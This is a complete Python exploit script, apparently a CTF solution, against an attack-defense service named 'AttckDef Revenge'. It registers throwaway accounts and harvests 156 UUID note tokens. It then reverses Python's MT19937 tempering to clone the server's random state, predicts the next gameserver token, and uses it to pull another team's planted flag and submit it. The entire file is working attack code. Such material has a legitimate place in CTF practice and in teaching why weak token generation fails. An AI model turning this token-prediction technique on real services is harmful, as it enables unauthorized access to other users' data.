#!/usr/bin/env python3
"""Exploit AttckDef Revenge by cloning its shared MT19937 token RNG."""

from __future__ import annotations

import argparse
import random
import secrets
import sys
import time
import urllib.parse
import uuid

import requests


def undo_right(value: int, shift: int) -> int:
    result = value
    for _ in range(10):
        result = value ^ (result >> shift)
    return result & 0xFFFFFFFF


def undo_left(value: int, shift: int, mask: int) -> int:
    result = value
    for _ in range(10):
        result = value ^ ((result << shift) & mask)
    return result & 0xFFFFFFFF


def untemper(value: int) -> int:
    value = undo_right(value, 18)
    value = undo_left(value, 15, 0xEFC60000)
    value = undo_left(value, 7, 0x9D2C5680)
    return undo_right(value, 11)


def clone_from_uuids(tokens: list[str]) -> random.Random:
    if len(tokens) != 156:
        raise ValueError("exactly 156 UUID tokens are required")

    outputs: list[int] = []
    for token in tokens:
        value = uuid.UUID(token).int
        # CPython assembles getrandbits(128) from four consecutive 32-bit
        # MT outputs, with the earliest output in the least-significant word.
        outputs.extend((value >> (32 * i)) & 0xFFFFFFFF for i in range(4))

    clone = random.Random()
    clone.setstate((3, tuple(untemper(word) for word in outputs) + (624,), None))
    return clone


class API:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.session = requests.Session()

    def request(
        self,
        method: str,
        path: str,
        body: dict | None = None,
        token: str | None = None,
        timeout: float = 20,
    ) -> tuple[int, dict]:
        headers = {"Accept": "application/json"}
        if token:
            headers["Authorization"] = f"Bearer {token}"
        response = self.session.request(
            method,
            self.base + path,
            json=body,
            headers=headers,
            timeout=timeout,
        )
        try:
            payload = response.json()
        except ValueError:
            payload = {"message": response.text}
        return response.status_code, payload

    def get(self, path: str, **kwargs) -> tuple[int, dict]:
        return self.request("GET", path, **kwargs)

    def post(self, path: str, body: dict, **kwargs) -> tuple[int, dict]:
        return self.request("POST", path, body=body, **kwargs)


def wait_for_safe_harvest_window(api: API, minimum: int = 90) -> None:
    while True:
        status, game = api.get("/api/game/status")
        if status != 200:
            raise RuntimeError(f"game status failed: HTTP {status}: {game}")
        remaining = int(game["seconds_remaining"])
        print(f"[*] current tick {game['current_tick']}; {remaining}s remaining")
        if remaining >= minimum:
            flag_status, feed = api.get("/api/flag_ids")
            if flag_status == 200 and feed.get("ticks"):
                newest = max(int(item["tick"]) for item in feed["ticks"])
                # Ensure this tick's internal gameserver getrandbits() call
                # happened before we begin collecting consecutive outputs.
                if newest == int(game["current_tick"]):
                    return
            time.sleep(1)
            continue
        time.sleep(remaining + 3)


def harvest(api: API) -> tuple[list[str], str]:
    tokens: list[str] = []
    password = "harvest-" + secrets.token_hex(8)

    # 32 accounts x 5 notes gives 160 observations. Use 156 for state and
    # the 157th as a synchronization check; a few remain for diagnostics.
    for account_index in range(32):
        username = "harv_" + secrets.token_hex(6)
        status, result = api.post(
            "/api/register", {"username": username, "password": password}
        )
        if status != 200 or "token" not in result:
            raise RuntimeError(f"registration failed: HTTP {status}: {result}")
        bearer = result["token"]

        for note_index in range(5):
            status, result = api.post(
                "/api/notes",
                {"title": f"sync {note_index}", "content": "x"},
                token=bearer,
            )
            if status != 200:
                raise RuntimeError(f"note creation failed: HTTP {status}: {result}")
            tokens.append(result["note"]["token"])

        print(f"\r[*] harvested {len(tokens)}/160 UUIDs", end="", flush=True)
    print()
    return tokens, password


def newest_flag_id(api: API) -> tuple[int, str]:
    status, result = api.get("/api/flag_ids")
    if status != 200:
        raise RuntimeError(f"flag-ID feed failed: HTTP {status}: {result}")
    newest = max(result["ticks"], key=lambda item: int(item["tick"]))
    return int(newest["tick"]), newest["flag_ids"][0]


def exploit(base: str) -> str:
    api = API(base)
    wait_for_safe_harvest_window(api)
    tokens, _ = harvest(api)

    clone = clone_from_uuids(tokens[:156])
    predicted_check = str(uuid.UUID(int=clone.getrandbits(128)))
    if predicted_check != tokens[156]:
        raise RuntimeError(
            "PRNG synchronization failed (a gameserver or another client "
            "created a note during the harvest); rerun just after a tick"
        )
    # Account for the other three already-created harvest notes.
    for observed in tokens[157:160]:
        predicted = str(uuid.UUID(int=clone.getrandbits(128)))
        if predicted != observed:
            raise RuntimeError("PRNG synchronization was lost during verification")
    print("[+] cloned and verified the server's MT19937 state")

    predicted_gameserver_token = str(uuid.UUID(int=clone.getrandbits(128)))
    old_tick, _ = newest_flag_id(api)
    print(f"[*] predicted next gameserver token: {predicted_gameserver_token}")
    print(f"[*] waiting for a flag newer than tick {old_tick}")

    while True:
        time.sleep(1)
        tick, flag_id = newest_flag_id(api)
        if tick > old_tick:
            break

    note_id = flag_id.split(":", 1)[1]
    # A fresh account avoids any share-check CAPTCHA state.
    username = "read_" + secrets.token_hex(6)
    status, auth = api.post(
        "/api/register",
        {"username": username, "password": "reader-" + secrets.token_hex(8)},
    )
    if status != 200:
        raise RuntimeError(f"reader registration failed: HTTP {status}: {auth}")

    query = urllib.parse.urlencode(
        {"note_id": note_id, "token": predicted_gameserver_token}
    )
    status, released = api.get(
        "/api/notes/validate-token?" + query,
        token=auth["token"],
        timeout=15,
    )
    planted_flag = released.get("content")
    if status != 200 or not planted_flag:
        raise RuntimeError(f"predicted token was rejected: HTTP {status}: {released}")
    print(f"[+] released planted flag {planted_flag} from {flag_id}")

    status, result = api.post(
        "/api/submit", {"flag_id": flag_id, "flag": planted_flag}
    )
    if status != 200 or result.get("status") != "accepted":
        raise RuntimeError(f"submission failed: HTTP {status}: {result}")
    final_flag = result["flag"]
    print(f"[+] FINAL FLAG: {final_flag}")
    return final_flag


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("base_url", help="full private range instance URL")
    args = parser.parse_args()
    try:
        exploit(args.base_url)
    except (OSError, RuntimeError, ValueError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
